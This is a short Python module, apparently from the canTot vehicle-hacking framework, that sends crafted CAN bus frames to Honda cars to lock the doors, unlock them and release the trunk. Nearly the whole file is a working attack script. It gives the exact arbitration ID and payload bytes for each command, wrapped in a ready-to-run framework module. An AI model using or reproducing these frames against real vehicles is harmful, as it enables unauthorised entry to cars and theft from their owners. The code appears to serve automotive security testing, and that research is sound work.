from sploitkit import *
import can
import time

class honda_car_lock_and_unlock(Module):
    """ This module will control Honda's doors and trunk over CAN based on Greg Hogan's openioc.

    Author:  shipcod3 # canTot module
    Credits: Greg Hogan
    Reference: https://github.com/gregjhogan/openioc
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        bus = can.interface.Bus(bustype="socketcan", channel=self.config.option('INTERFACE').value)
        try:
            print("[*] Locking all doors")
            lock_all_doors = can.Message(arbitration_id=0x16f118f0, data=[0x30,0x04,0x01,0x00,0x00,0x00,0x00,0x00], is_extended_id=True)
            bus.send(lock_all_doors)
            time.sleep(1)

            print("[*] Unlocking all doors")
            unlock_all_doors = can.Message(arbitration_id=0x16f118f0, data=[0x30,0x05,0x01,0x00,0x00,0x00,0x00,0x00], is_extended_id=True)
            unlock_all_doors_alt = can.Message(arbitration_id=0x16f118f0, data=[0x30,0x06,0x01,0x00,0x00,0x00,0x00,0x00], is_extended_id=True)
            bus.send(unlock_all_doors)
            bus.send(unlock_all_doors_alt)
            time.sleep(1)

            print("[*] Releasing trunk")
            trunk_release = can.Message(arbitration_id=0x16f118f0, data=[0x30,0x09,0x01,0x00,0x00,0x00,0x00,0x00], is_extended_id=True)
            bus.send(trunk_release)
        except:
            print("Messages not sent. Module failed!")
